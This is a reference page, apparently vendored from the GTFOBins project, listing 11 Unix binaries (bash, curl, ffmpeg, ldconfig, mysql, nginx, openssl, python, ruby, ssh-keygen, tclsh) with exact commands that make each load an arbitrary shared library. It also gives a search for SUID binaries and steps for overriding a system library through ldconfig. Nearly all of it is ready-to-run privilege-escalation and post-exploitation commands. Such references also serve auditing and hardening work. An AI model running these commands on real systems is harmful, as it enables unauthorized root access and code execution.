---
title: "GTFOBins - library-load (11 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "library-load", "libraryload"]
summary: "11 Unix binaries whose library-load function loads an arbitrary shared library."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary whose `library-load` function loads an arbitrary shared library, with the exact command. 11 binaries.

## Finding your way in

```bash
# intersect what is available with what is on this page
find / -perm -4000 -type f 2>/dev/null
```

## library-load payloads

### bash

library-load — suid variant

*Contexts: suid*

```bash
bash -p -c 'enable -f /path/to/lib.so x'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
bash -c 'enable -f /path/to/lib.so x'
```

### curl

*Contexts: sudo, suid, unprivileged*

```bash
curl --engine /path/to/lib.so x
```

### ffmpeg

*Contexts: sudo, suid, unprivileged*

```bash
ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J
```

### ldconfig

This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.

First identify the shared libraries used by the target program, for example:

```
$ ldd /bin/ping | grep libcap
        libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000)
```

Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).

*Contexts: sudo, suid, unprivileged*

```bash
echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping
```

### mysql

The following loads the `/path/to/lib.so` shared object.

*Contexts: sudo, suid, unprivileged*

```bash
mysql --default-auth ../../../../../path/to/lib
```

### nginx

Alternatively, the `ssl_engine` directive can be used.

*Contexts: sudo, suid, unprivileged*

```bash
cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file
```

### openssl

*Contexts: sudo, suid, unprivileged*

```bash
openssl req -engine ./lib.so
```

### python

*Contexts: capabilities, sudo, suid, unprivileged*

```bash
python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
```

### ruby

*Contexts: sudo, unprivileged*

```bash
ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
```

### ssh-keygen

The shared library must contain the `void C_GetFunctionList() {}` function.

*Contexts: sudo, suid, unprivileged*

```bash
ssh-keygen -D /path/to/lib.so
```

### tclsh

*Contexts: capabilities, sudo, suid, unprivileged*

```bash
tclsh
load /path/to/lib.so x
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
